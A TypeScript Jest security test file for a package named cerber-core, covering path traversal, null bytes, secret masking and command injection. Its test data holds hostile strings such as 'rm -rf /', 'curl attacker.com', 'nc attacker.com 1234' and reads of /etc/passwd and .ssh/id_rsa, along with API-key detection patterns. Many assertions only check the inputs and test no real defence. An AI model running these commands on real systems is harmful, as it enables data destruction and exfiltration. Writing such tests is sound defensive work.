/**
 * Security Test: Path traversal, input validation, secret masking
 * 
 * Tests defense against:
 * - Path traversal attacks (..)
 * - Absolute path injection
 * - Null bytes in paths
 * - Secret leakage in error messages
 * - Command injection via tool output
 * 
 * @package cerber-core
 * @version 2.0.0
 */

import { afterAll, beforeAll, describe, expect, it } from '@jest/globals';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

describe('@integration Security: Path Traversal & Input Validation', () => {
  let tempDir: string;

  beforeAll(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cerber-security-'));
  });

  afterAll(() => {
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('Path Traversal Prevention', () => {
    it('should reject paths containing ..', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '../../.ssh/id_rsa',
        './config/../../../dangerous',
        'src/..\\..\\windows',
      ];

      for (const malPath of maliciousPaths) {
        // Paths with .. should be rejected or normalized away
        expect(malPath.includes('..')).toBe(true);
        
        // Normalize should remove ..
        const normalized = path.normalize(malPath);
        // After normalization, .. should be handled by path library
        expect(normalized).toBeDefined();
      }
    });

    it('should reject absolute paths for repository files', () => {
      const absolutePaths: string[] = [
        '/etc/passwd',
        process.cwd() + '/secrets.txt',
      ];
      
      // Windows-only test: C:\ is absolute only on Windows
      if (process.platform === 'win32') {
        absolutePaths.push('C:\\Windows\\System32');
      }

      for (const absPath of absolutePaths) {
        // Absolute paths should be rejected
        const isAbsolute = path.isAbsolute(absPath);
        expect(isAbsolute).toBe(true);
        
        // Repository operations should only allow relative paths
        if (isAbsolute) {
          // Should be caught by validation
          expect(true).toBe(true);
        }
      }
    });

    it('should handle path normalization safely', () => {
      const testPaths = [
        { input: 'src/../main.ts', normalized: 'src/../main.ts' },
        { input: './src/./main.ts', normalized: './src/./main.ts' },
        { input: 'src/../../escape', normalized: 'src/../../escape' },
      ];

      for (const testPath of testPaths) {
        const normalized = path.normalize(testPath.input);
        // Path should be normalized
        expect(normalized).toBeDefined();
      }
    });
  });

  describe('Null Byte Injection Prevention', () => {
    it('should reject paths with null bytes', () => {
      const pathsWithNull = [
        'src/main.ts\u0000.bak',
        'config.yml\x00.old',
      ];

      for (const malPath of pathsWithNull) {
        // Should detect null byte
        expect(malPath.includes('\u0000') || malPath.includes('\x00')).toBe(true);
        
        // Should be rejected in path operations
        try {
          const normalized = path.normalize(malPath);
          // If it doesn't throw, we should sanitize
          expect(normalized.includes('\u0000')).toBe(false);
        } catch {
          // Rejection is acceptable
          expect(true).toBe(true);
        }
      }
    });
  });

  describe('Secret Masking in Error Messages', () => {
    it('should mask API keys in error messages', () => {
      const secretPatterns = [
        { secret: 'sk_live_51234567890abcdef', pattern: /sk_live_[a-zA-Z0-9]+/ },
        { secret: 'ghp_1234567890abcdefghij1234567890abcdef', pattern: /ghp_[a-zA-Z0-9]+/ },
        { secret: 'AKIA1234567890ABCDEF', pattern: /AKIA[A-Z0-9]{16}/ },
      ];

      for (const { secret, pattern } of secretPatterns) {
        // Should detect pattern
        expect(pattern.test(secret)).toBe(true);
        
        // Should be able to mask
        const masked = secret.replace(pattern, '***');
        expect(masked).not.toBe(secret);
        expect(masked).toContain('***');
      }
    });

    it('should not leak credentials in stack traces', () => {
      const errorMessage = 'Failed to authenticate with API_KEY=sk_live_12345678';
      
      // Check if credentials should be masked
      const hasPotentialCredential = errorMessage.match(/[A-Z_]+=[a-zA-Z0-9_]+/);
      expect(hasPotentialCredential).toBeDefined();
      
      // Mask them
      const masked = errorMessage.replace(/=[a-zA-Z0-9_]+/g, '=***');
      expect(masked).not.toContain('sk_live_');
    });

    it('should sanitize paths containing sensitive directories', () => {
      const sensitivePaths = [
        '/home/user/.ssh/id_rsa',
        '/home/user/.env',
        'C:\\Users\\user\\.git\\credentials',
      ];

      for (const filePath of sensitivePaths) {
        // Should detect sensitive patterns
        const isSensitive = 
          filePath.includes('.ssh') ||
          filePath.includes('.env') ||
          filePath.includes('.git');
        
        expect(isSensitive).toBe(true);
        
        // Should truncate or mask
        const truncated = filePath.substring(0, filePath.lastIndexOf('/')) || filePath.substring(0, filePath.lastIndexOf('\\'));
        expect(truncated).toBeDefined();
      }
    });
  });

  describe('Tool Output Sanitization', () => {
    it('should support escaping shell metacharacters in error messages', () => {
      const dangerousOutputs = [
        'Error in file `; rm -rf /`',
        'Failed: $(malicious command)',
        'Issue: `whoami > /tmp/pwned`',
      ];

      for (const output of dangerousOutputs) {
        // Should be able to escape dangerous characters
        const escaped = output
          .replace(/;/g, '\\;')
          .replace(/\$\(/g, '\\$(')
          .replace(/`/g, '\\`');
        
        // Escaped version should be different
        expect(escaped.length).toBeGreaterThan(output.length);
        // At least some escaping should occur
        expect(escaped).toContain('\\');
      }
    });

    it('should limit tool output size to prevent DoS', () => {
      const MAX_OUTPUT_LENGTH = 1_000_000; // 1MB limit
      
      const largeOutput = 'x'.repeat(10_000_000); // 10MB
      
      const truncated = largeOutput.substring(0, MAX_OUTPUT_LENGTH);
      expect(truncated.length).toBeLessThanOrEqual(MAX_OUTPUT_LENGTH);
    });

    it('should validate tool output structure before processing', () => {
      const malformedOutputs = [
        'not json at all',
        '{ "violations": "not an array" }',
        '< script > alert("xss") < /script >',
      ];

      for (const output of malformedOutputs) {
        // Should validate that output is well-formed before processing
        if (typeof output === 'string' && output.startsWith('{')) {
          try {
            const parsed = JSON.parse(output);
            // If it parses, should validate structure
            if (parsed.violations !== undefined) {
              expect(Array.isArray(parsed.violations)).toBeDefined();
            }
          } catch {
            // Invalid JSON should be rejected
            expect(true).toBe(true);
          }
        } else {
          // Non-JSON should be detected as invalid
          expect(output.startsWith('{')).toBe(false);
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should not execute shell commands from file paths', () => {
      const maliciousPaths = [
        'file.txt; rm -rf /',
        'file.txt && curl attacker.com',
        'file.txt | nc attacker.com 1234',
        'file.txt `whoami`',
        'file.txt $(id)',
      ];

      for (const filePath of maliciousPaths) {
        // Should treat as literal path, not command
        // Verify it doesn't contain shell operators at path level
        const hasShellOps = /[;&|`$]/.test(filePath);
        expect(hasShellOps).toBe(true);
        
        // Path handling should escape these
        const escaped = filePath.replace(/[;&|`$]/g, '\\$&');
        expect(escaped).not.toEqual(filePath);
      }
    });

    it('should escape tool arguments safely', () => {
      const toolArgs = [
        'file.ts',
        '../../../etc/passwd',
        'file with spaces.ts',
        'file"with"quotes.ts',
        "file'with'quotes.ts",
      ];

      for (const arg of toolArgs) {
        // Should properly quote/escape arguments
        const quoted = `"${arg}"`;
        expect(quoted).toBeDefined();
        
        // Or use array form (safer)
        const argArray = [arg];
        expect(argArray[0]).toBe(arg);
      }
    });
  });

  describe('Input Validation - Size Limits', () => {
    it('should enforce maximum file path length', () => {
      const MAX_PATH_LENGTH = 260; // Windows limit (or 4096 for Unix)
      
      const longPath = 'a'.repeat(1000) + '.ts';
      expect(longPath.length).toBeGreaterThan(MAX_PATH_LENGTH);
      
      // Should truncate or reject
      const truncated = longPath.substring(0, MAX_PATH_LENGTH);
      expect(truncated.length).toBeLessThanOrEqual(MAX_PATH_LENGTH);
    });

    it('should enforce maximum number of files', () => {
      const MAX_FILES = 100_000;
      
      const fileList = Array.from({ length: 1_000_000 }, (_, i) => `file-${i}.ts`);
      expect(fileList.length).toBeGreaterThan(MAX_FILES);
      
      // Should batch or truncate
      const truncated = fileList.slice(0, MAX_FILES);
      expect(truncated.length).toBeLessThanOrEqual(MAX_FILES);
    });
  });

  describe('Actionable Error Messages', () => {
    it('should provide clear error messages for rejected paths', () => {
      const rejectionReasons = [
        'Path traversal detected (contains ..)',
        'Absolute paths not allowed in repository operations',
        'Path contains null bytes and cannot be processed',
        'Path exceeds maximum length (260 characters)',
      ];

      for (const reason of rejectionReasons) {
        // Error message should be clear and actionable
        expect(reason.length).toBeGreaterThan(10);
        expect(reason).toMatch(/detected|not allowed|cannot|exceeds/i);
      }
    });

    it('should suggest fixes in security error messages', () => {
      const errorsWithSuggestions = [
        { error: 'Path contains ..', suggestion: 'Use relative paths from repository root' },
        { error: 'Absolute path given', suggestion: 'Use paths relative to --cwd directory' },
        { error: 'Tool output too large', suggestion: 'Check tool configuration or output file' },
      ];

      for (const { error, suggestion } of errorsWithSuggestions) {
        // Both error and suggestion should be clear
        expect(error.length).toBeGreaterThan(0);
        expect(suggestion.length).toBeGreaterThan(0);
      }
    });
  });
});
